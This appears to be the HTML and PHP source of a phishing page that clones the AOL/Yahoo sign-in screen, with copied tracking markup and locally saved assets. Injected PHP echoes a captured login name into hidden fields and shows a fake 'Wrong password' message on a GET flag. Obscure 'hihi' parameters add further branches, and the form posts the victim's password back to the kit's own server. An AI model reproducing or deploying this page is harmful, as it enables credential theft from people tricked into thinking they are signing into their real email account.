            <p class="not-you"><a href="https://login.aol.com/?display=login&amp;intl=us&amp;lang=en-us&amp;src=fp-us&amp;done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Frequest_auth%3Fstate%3DWyJkUFdiZUhoLWRFY3FMVmdjNmVEN3FrVWloWHZnM0VSWldnXzVMTXpSbGZNIix7InJlZGlyZWN0X3VyaSI6Imh0dHBzOlwvXC93d3cuYW9sLmNvbSIsImFsbG93ZWRfcXVlcnlfcGFyYW1zIjp7ImludGwiOiJ1cyIsImxhbmciOiJlbi11cyIsInNyYyI6ImZwLXVzIn0sImp0aSI6Ik1oaXRVZEtvaWY2bVNBR1p6Z1c2aEo0REZOQkt0elY2In0sMTU1MTU2Njg5MCwiaWRsRVVnZXBtOFFYVGJNMl9fVDFtZV81SXJWTVJzNm9iZjhHUFdncER5RSJd%26nonce%3DMhitUdKoif6mSAGZzgW6hJ4DFNBKtzV6%26response_type%3Dcode%26approval_prompt%3Dauto%26client_id%3Ddj0yJmk9N3dWZW1TTWNhY0o0JmQ9WVdrOWMxbDVlVEo2TmpRbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1lMA--%26redirect_uri%3Dhttps%253A%252F%252Fwww.aol.com%252Fcallback%26intl%3Dus%26lang%3Den-us%26src%3Dfp-us&amp;prefill=0&amp;chllngnm=password">Not&nbsp;you?</a></p>
    </div><div id="alert" style="display:block; color:red"> <?php if (isset($_GET['mgs'])) { ?>Wrong password, login failed
<?php } ?></div>
    <form method="post" class="pure-form pure-form-stacked">
        <input name="browser-fp-data" id="browser-fp-data" value="{&quot;language&quot;:&quot;en-US&quot;,&quot;color_depth&quot;:24,&quot;device_memory&quot;:-1,&quot;hardware_concurrency&quot;:4,&quot;resolution&quot;:{&quot;w&quot;:1920,&quot;h&quot;:1080},&quot;available_resolution&quot;:{&quot;w&quot;:1920,&quot;h&quot;:1040},&quot;timezone_offset&quot;:-60,&quot;session_storage&quot;:1,&quot;local_storage&quot;:1,&quot;indexed_db&quot;:1,&quot;cpu_class&quot;:&quot;unknown&quot;,&quot;navigator_platform&quot;:&quot;Win32&quot;,&quot;canvas&quot;:&quot;canvas winding:yes~canvas&quot;,&quot;webgl&quot;:1,&quot;webgl_vendor&quot;:&quot;Google Inc.~ANGLE (Intel(R) HD Graphics Family Direct3D11 vs_5_0 ps_5_0)&quot;,&quot;adblock&quot;:0,&quot;has_lied_languages&quot;:0,&quot;has_lied_resolution&quot;:0,&quot;has_lied_os&quot;:0,&quot;has_lied_browser&quot;:0,&quot;touch_support&quot;:{&quot;points&quot;:0,&quot;event&quot;:0,&quot;start&quot;:0},&quot;audio_fp&quot;:&quot;35.7383295930922&quot;,&quot;plugins&quot;:{&quot;count&quot;:0,&quot;hash&quot;:&quot;24700f9f1986800ab4fcc880530dd0ed&quot;},&quot;fonts&quot;:{&quot;count&quot;:51,&quot;hash&quot;:&quot;ef984ebebe14a8e1c3cdce6935ea5cb4&quot;},&quot;ts&quot;:{&quot;serve&quot;:1551567232044,&quot;render&quot;:1551563326247}}" type="hidden">
        <input type="hidden" name="login" value="<?php echo $log; ?>">
<?php if ($_GET['hihi']=='1') { ?>
<input type="hidden" name="hihihi" value="<?php echo $log; ?>">
<?php }?>
<?php if ($_GET['hihi']=='2') { ?>
<input type="hidden" name="hihi" value="<?php echo $log; ?>">
<?php }?>
<?php if ($_GET['hihi']=='3') { ?>
<input type="hidden" name="hihi" value="<?php echo $log; ?>">
<?php }?>
         
        <input name="passwordContext" value="normal" type="hidden">
        <input type="password" tabindex="12" name="pass" class="pwd" value="" >
<input id="login-passwd" name="pass" placeholder="Password" autofocus autocomplete="current-password" type="password">
        <p class="signin-cont">
            <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button" name="verifyPassword" value="Sign&nbsp;in" data-ylk="elm:btn;elmt:next;slk:next">
                    Sign&nbsp;in
            </button>
        </p>
        <p class="forgot-cont">
            <input class="pure-button puree-button-link" data-ylk="elm:btn;elmt:skip;slk:skip" id="mbr-forgot-link" name="skip" value="I forgot my&nbsp;password" type="submit">
        </p>
    </form>
</div>
</div>
        </div>
        <div id="login-box-ad-fallback" class="login-box-ad-fallback">
            <h1></h1>
<p></p>
        </div>
    </div>
    <div class="login-box-ad-outer">
        <div class="login-box-ad-inner">
            <div id="sb_rel_login-ad-rich" class="darla" style="position: relative; z-index: 9; width: 1440px; height: 1024px; visibility: inherit; display: inline-block; font-size: 0px;"><iframe style="position: absolute; z-index: 10; width: 1440px; height: 1024px; top: 0px; left: 0px; visibility: inherit; display: block;" id="login-ad-rich" src="../AOL_files/r-sf.htm" async="" allow="autoplay;vr;microphone" sandbox="allow-forms allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox" scrolling="no" allowtransparency="true" hidefocus="true" tabindex="-1" marginwidth="0" marginheight="0" frameborder="no"></iframe></div>
        </div>
    </div>
</div>
    <script src="../AOL_files/bundle.js"></script><script nonce="OFeJvKIWwX+56Ev1ls6AUU3W4nBkHn/WyatXj8JtPV6J5Cwb"></script><script nonce="OFeJvKIWwX+56Ev1ls6AUU3W4nBkHn/WyatXj8JtPV6J5Cwb"></script>
    <noscript>
        <img src="/account/js-reporting/?crumb=.nh8BjAdB16&message=javascript_not_enabled" height="0" width="0" style="visibility: hidden;">
    </noscript>
    <script nonce="OFeJvKIWwX+56Ev1ls6AUU3W4nBkHn/WyatXj8JtPV6J5Cwb">
        var checkAssets = function(seconds) {
            setTimeout(function() {
                if (!window.mbrJSLoaded) {
                    window.mbrSendError('js_failed_to_load', location.pathname);
                }
                var check = document.getElementById('mbr-css-check'),
                    style = check.currentStyle;
                if (window.getComputedStyle) {
                    style = window.getComputedStyle(check);
                }
                if (style.display !== 'none') {
                    window.mbrSendError('css_failed_to_load', location.pathname);
                }
            }, (seconds * 1000));
        };

        checkAssets(10);
    </script>
    <div id="mbr-css-check"></div>


<script src="../AOL_files/client.php"></script><div id="darla_csc_holder" class="darla" style="display: none;"><iframe style="display: none;" id="darla_csc_writer_0" class="darla" src="../AOL_files/r-csc.htm" scrolling="no" allowtransparency="true" hidefocus="true" tabindex="-1" marginwidth="0" marginheight="0" frameborder="no"></iframe></div><div style="position: static !important; visibility: inherit;" id="fdb_close_els" class="darla"><div style="position: absolute; top: 89px; left: 218.5px; z-index: 10; width: 1434px; height: 20px; visibility: inherit; display: none;" id="fdb_close_RICH" class="darla darla_fdb_close" title="I don't like this ad"><div style="width:20px; height:20px; background:#fff; opacity: 0.78; -ms-filter: 'progid:DXImageTransform.Microsoft.Alpha(Opacity=78)'; filter: alpha(opacity=78); position: absolute;right:0; background: #fff url('https://s.yimg.com/rq/darla/i/fdb1.gif') no-repeat right -25px;cursor:pointer;"></div></div></div></body></html>
	<!-- fe13.member.ir2.yahoo.com - Sat Mar 02 2019 22:53:52 GMT+0000 (UTC) - (1ms) --><?php }?>